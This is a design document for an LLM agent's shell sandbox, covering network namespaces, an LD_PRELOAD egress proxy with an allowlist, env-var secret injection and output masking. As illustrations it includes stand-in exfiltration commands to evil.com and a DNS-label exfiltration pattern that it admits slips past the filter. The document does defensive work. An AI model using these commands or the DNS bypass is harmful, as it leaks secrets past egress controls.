# Shell Networking: LD_PRELOAD + UDS Proxy

## Design Summary

Shell children are network-isolated via `CLONE_NEWNET` (hard backstop) and given controlled outbound access through an `LD_PRELOAD` shared library that routes connections through a Unix domain socket to a proxy thread in the agent process.

Secrets are injected via environment variables (`CCLAW_SECRET_<NAME>`), never interpolated into command strings. Output is masked before storage.

## Security Layers

| Layer | Mechanism | Kernel-enforced? |
|-------|-----------|-----------------|
| Network kill | `CLONE_NEWNET` — no interfaces, no routes | Yes |
| Controlled egress | `LD_PRELOAD=libcclaw_net.so` → UDS → proxy | No (app-level) |
| Filesystem | `CLONE_NEWNS` — `/` ro, workspace rw | Yes |
| Env stripping | Unset CCLAW_*, API keys before exec | No (app-level) |
| Secret injection | `CCLAW_SECRET_*` env vars (selective) | No (app-level) |
| Output masking | Replace secret values with `[REDACTED]` | No (app-level) |
| Allowlist | Proxy checks egress rules (hostname + CIDR) before connect | No (app-level) |

Key insight: `CLONE_NEWNET` is the hard boundary. Everything else is convenience/defense-in-depth. A static binary that bypasses LD_PRELOAD gets zero network, not unrestricted network.

**Terminology: "broker" vs "proxy" are not the same scope.** "Broker" names
the whole forked per-call tool worker (`tool_shell_handler` et al.) — it sets
up the sandbox, injects secrets, drains the output pipe, *and* hosts the
egress proxy in a thread. "Proxy" / `ProxyContext` (`proxy.c`) names
specifically the egress-decision-and-relay subsystem the broker stands up for
that one call — `host_decide()`, `addr_permitted()`, `dial_ip()`, `relay()`.
The proxy is a piece the broker hosts, not a synonym for it; keep the two
words scoped that way in comments and docs so "the broker enforces X" doesn't
get misread as "the whole tool-exec worker is the firewall."

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│ Agent Process (host netns)                              │
│                                                         │
│  ┌─────────────┐     ┌──────────────────────────────┐  │
│  │ Agent loop  │     │ Proxy thread                  │  │
│  │ (LLM, tools)│     │ - listens on .proxy.sock     │  │
│  └──────┬──────┘     │ - reads preamble (host:port) │  │
│         │            │ - checks egress rules         │  │
│         │ fork       │ - resolves DNS                │  │
│         ▼            │ - opens real TCP, relays      │  │
│  ┌─────────────┐     └──────────────┬───────────────┘  │
│  │ Shell child │                    │                   │
│  │ (new netns) │◄── UDS ──────────►│                   │
│  │             │  (.proxy.sock      │                   │
│  │ LD_PRELOAD  │   in workspace)    │                   │
│  │ intercepts  │                    │                   │
│  │ connect()   │                    │                   │
│  └─────────────┘                    │                   │
│                                     │ libcurl           │
│                                     ▼                   │
│                              ┌─────────────┐            │
│                              │ Real network│            │
│                              │ (host netns)│            │
│                              └─────────────┘            │
└─────────────────────────────────────────────────────────┘
```

## Connection Flow

```
shell: curl https://api.github.com/repos
  1. curl calls connect("api.github.com", 443)
  2. libcclaw_net.so intercepts connect()
  3. lib opens UDS to <workspace>/.proxy.sock
  4. lib sends preamble: "api.github.com:443\n"
  5. proxy reads preamble, checks egress rules → allowed
  6. proxy resolves api.github.com, opens real TCP:443
  7. proxy relays bytes bidirectionally (TLS passthrough)
  8. curl does TLS handshake directly with api.github.com
  9. curl sends request with $CCLAW_SECRET_GITHUB_TOKEN from env
  10. response flows back through proxy → UDS → curl

shell: curl https://evil.com/steal
  1. curl calls connect("evil.com", 443)
  2. libcclaw_net.so intercepts, opens UDS, sends "evil.com:443\n"
  3. proxy checks egress rules → NOT listed
  4. proxy closes UDS (connection refused)
  5. curl gets ECONNREFUSED

static-binary: ./exploit --connect evil.com
  1. binary calls raw syscall connect() — bypasses LD_PRELOAD
  2. kernel: CLONE_NEWNET — no interfaces, no routes
  3. connect() returns ENETUNREACH
  4. binary gets nothing
```

## libcclaw_net.so

Minimal shared library (~200 LOC). Intercepts:

- `connect()` — if AF_INET/AF_INET6 TCP, route through UDS; else passthrough (AF_UNIX, UDP)
- `getaddrinfo()` — forward through UDS for proxy-side resolution (optional; can also just let the connect preamble carry the hostname)

**Egress rule model** (as of 2026-06): the proxy partitions per-agent grants
into two sets at `proxy_bind` time: hostname rules (exact + `.`-prefix suffix
match, case-insensitive) and CIDR rules (parsed IPv4/IPv6 CIDRs + bare literal
IPs stored as /32 or /128). A CONNECT or RESOLVE request is admitted if either
set matches. Private/metadata IPs have additional constraints — see
`specs/egress-filter.md` §4 and §6. Default-deny: no rules → no egress.

Protocol over UDS:
```
Client → Proxy: "<host>:<port>\n"        (text preamble, max 256 bytes)
Proxy → Client: "OK\n"                   (connection established)
         or     "DENIED\n"               (host not in allowlist)
         or     "ERROR <msg>\n"          (DNS failure, connect timeout, etc.)
[bidirectional byte relay after OK]
```

Build: `gcc -shared -fPIC -o libcclaw_net.so src/preload_net.c`
Install: alongside agent binary or in workspace.

## Coverage: which binaries actually get proxied

Two independent on-ramps reach the same broker UDS, because "arbitrary
LLM-issued shell command" and "cclaw's own libcurl in web_fetch/js_eval" need
different interception strategies. Neither is a superset of the other, so a
given binary's coverage depends on *how* it opens sockets:

| Binary / runtime class                                   | Mechanism             | Why |
|------------------------------------------------------------|------------------------|-----|
| Dynamically-linked C/C++ (`curl`, `wget`, `git`, `openssh`, `nc`, `socat`, `openssl s_client`) | LD_PRELOAD | Resolves `connect()`/`getaddrinfo()` via normal dynamic symbol lookup — caught unconditionally, whether or not the tool itself knows about proxies. |
| Dynamically-linked interpreters (CPython, Ruby, PHP, Perl) and their stdlib HTTP clients | LD_PRELOAD | The interpreter binary itself is dynamically linked; its socket layer calls libc `connect()` under the hood. |
| JVM (`java.net.Socket`, NIO) | LD_PRELOAD | JNI native methods call libc `connect()` on Linux. |
| Rust binaries built for a `gnu` (glibc) target | LD_PRELOAD | Rust std links the `libc` crate on glibc targets and calls through it. |
| Go binaries using `net/http`'s default transport (`gh`, `kubectl`, `terraform`, `hugo`, most Go CLIs) | `net_shim` via `HTTP_PROXY` | Go's runtime always makes raw syscalls for networking (bypasses libc, so LD_PRELOAD is structurally blind to it), but `net/http.DefaultTransport` honors `HTTP_PROXY`/`HTTPS_PROXY` by default (`ProxyFromEnvironment`), so it still routes through the shim. |
| musl-statically-linked binaries that read proxy env vars (Alpine-built tools, some Rust `musl`-target builds) | `net_shim` via `HTTP_PROXY` | Static linking means no libc symbol to interpose, but cooperative proxy support still routes them correctly. |
| `web_fetch` / `js_eval` (cclaw's own libcurl) | `net_shim` via `HTTP_PROXY` only — LD_PRELOAD is deliberately *not* loaded for these tiers | Loading the preload here would intercept curl's own loopback connect to `net_shim` and fight the `HTTP_PROXY` path (see `preload_net.c`'s loopback-passthrough carve-out, needed only because shell tier runs both mechanisms at once). |
| Anything both raw-syscall *and* proxy-ignorant: a raw `net.Dial` in Go, `nc`/`socat` with a manual dial, a from-scratch static binary calling `connect()` directly | **Neither** | `CLONE_NEWNET` has no interface for it to route through regardless — the call gets `ENETUNREACH` (or hangs) and the tool call fails. This is a *functionality* gap, not a *security* gap: nothing in this category can leak past policy, it simply gets no network. |

The practical takeaway: coverage is good for the realistic population of
tools an LLM-driven shell agent reaches for (curl-likes, scripting-language
HTTP clients, common Go CLIs), and the remainder fails safe rather than fails
open. If a tool call mysteriously gets "connection refused" or hangs with no
proxy DENIED/ERROR ever logged, suspect this last row before suspecting the
policy layer.

### `channel_runner`: a separate tier with its own, narrower control

`channel_runner.c` (the process that runs Telegram/etc. channel extensions —
JS agents can author and promote via self-augmentation) is not proxy-fronted
at all; it makes outbound HTTP directly via its own curl handles, with none
of the LD_PRELOAD / `net_shim` / netns machinery above. It doesn't need an
allowlist, because a channel is semantically "talks to one external service,"
not arbitrary web access — so its egress control is a single-endpoint pin
instead: `make_easy()`'s `url_host_allowed()` (in `src/channel_runner.c`)
checks every outbound URL's host against the channel's own configured
`base_url` (via `curl_url()`, exact-host-equality, fail-closed if `base_url`
is unset) before any request goes out. This is the equivalent mechanism for
this tier, not an oversight — a proxy/allowlist model would be the wrong
shape for a process whose entire job is talking to one pre-known host.

## Secret Injection Model

```
cclaw.db (encrypted)
  │ decrypt at fork
  ▼
agent env: CCLAW_SECRET_GITHUB_TOKEN=ghp_abc123
  │ agent reads, stores in memory, unsets from env
  │ on shell_exec: selectively re-injects needed secrets
  ▼
shell child env: CCLAW_SECRET_GITHUB_TOKEN=ghp_abc123
  │ LLM wrote: curl -H "Authorization: Bearer $CCLAW_SECRET_GITHUB_TOKEN" ...
  │ shell expands var at runtime
  │ command string in DB only contains "$CCLAW_SECRET_GITHUB_TOKEN" (safe)
  ▼
shell output: "HTTP/1.1 200 OK..."
  │ tool_result_postprocess() (single masking chokepoint, in the parent)
  │ deinterpolate: known values (raw+base64+url) → {{SECRET:github_token}}
  │ then AC scan for unknown signature-matching secrets
  ▼
entries table: masked output stored
```

LLM is told: "You have these secrets available as env vars: `$CCLAW_SECRET_GITHUB_TOKEN`, `$CCLAW_SECRET_NPM_TOKEN`. Use them in shell commands by referencing the variable name. Never write the actual value."

## Threat Model

| Threat | Mitigation |
|--------|-----------|
| Shell leaks secret via `echo $SECRET` | Output masking catches it |
| Shell exfiltrates to attacker host | Proxy denies unlisted hosts |
| Shell bypasses LD_PRELOAD (static binary) | CLONE_NEWNET — zero network |
| LLM puts secret value in command string | Future: command safety gate (pattern check) |
| LLM encodes secret (base64) to evade masking | Partial: mask common encodings; accepted risk |
| Shell reads filesystem secrets | CLONE_NEWNS — `/` ro, workspace has no secrets |
| Prompt injection extracts secret | LLM only knows names, not values; output masked |

### Accepted Risks

| Risk | Rationale |
|------|-----------|
| LD_PRELOAD bypassable by static binaries | CLONE_NEWNET catches them (zero network) |
| Base64-encoded secrets evade masking | Low probability; egress allowlist limits damage |
| Shell child has secret in env memory | Ephemeral process; same as any CLI tool using env vars |
| Proxy sees all traffic in plaintext (TLS passthrough) | Proxy only sees encrypted bytes; no MITM |
| DNS query labels can carry exfiltrated data (`curl https://$(payload).allowed-suffix.com`) | `host_decide()`/`addr_permitted()` gate *which hostnames* may be resolved, not what's encoded in an otherwise-allowed query's label — the query itself leaves via the broker's real resolver before any connect/deny decision happens. Fundamental limit of hostname-allowlist egress filtering, not fixable within this pipeline; see `egress-filter.md` Q8 |

## Comparison: Previous Design (iptables REDIRECT) vs Current (LD_PRELOAD + UDS)

| Aspect | iptables REDIRECT | LD_PRELOAD + UDS |
|--------|------------------|-----------------|
| Cross-netns connectivity | Requires veth pair (needs host CAP_NET_ADMIN) | UDS via filesystem (works unprivileged) |
| Kernel requirement | iptables-legacy + ip_tables module | Just CLONE_NEWNET (standard) |
| Credential injection | MITM CA + TLS interception | Env vars (no MITM needed) |
| DNS handling | UDP 53 redirect + proxy resolver | getaddrinfo() intercept or preamble hostname |
| Static binary behavior | Redirected to proxy (still gets network) | Zero network (CLONE_NEWNET blocks) |
| Complexity | High (veth, iptables, MITM CA, SO_ORIGINAL_DST) | Low (~200 LOC preload lib + UDS proxy) |
| Pogoplug/ARMv5 compat | Needs iptables-legacy binary | Just needs LD_PRELOAD support (universal) |

## Implementation Tasks

- **T210**: `libcclaw_net.so` — LD_PRELOAD shared lib
- **T211**: Proxy thread — UDS listener in agent process
- **T212**: Secret env-var injection for shell children
- **T214**: Output secret masking
- **T215-T217**: Integration tests

## Non-Goals

- No TLS interception / MITM CA (secrets via env vars instead)
- No credential_mappings table (secrets are env vars, not proxy-injected headers)
- No iptables / netfilter rules
- No veth pairs or cross-namespace network plumbing
